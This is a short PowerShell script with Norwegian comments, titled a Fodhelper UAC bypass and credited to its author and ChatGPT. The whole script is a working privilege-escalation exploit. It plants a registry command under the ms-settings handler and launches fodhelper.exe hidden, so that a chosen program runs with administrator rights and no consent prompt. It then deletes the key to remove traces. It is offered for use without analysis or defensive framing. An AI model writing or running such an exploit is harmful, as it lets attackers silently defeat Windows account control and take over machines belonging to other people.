# Fodhelper UAC Bypass Script
# Av: Samat og ChatGPT :)

# Sett hvilket program du vil kjøre som administrator
$program = "cmd.exe /c start powershell.exe"  # Endre hvis du vil

# Lag nødvendig registerstruktur
New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

# Start fodhelper.exe for å trigge bypass
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

# Vent litt og rydd opp
Start-Sleep -Seconds 3
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
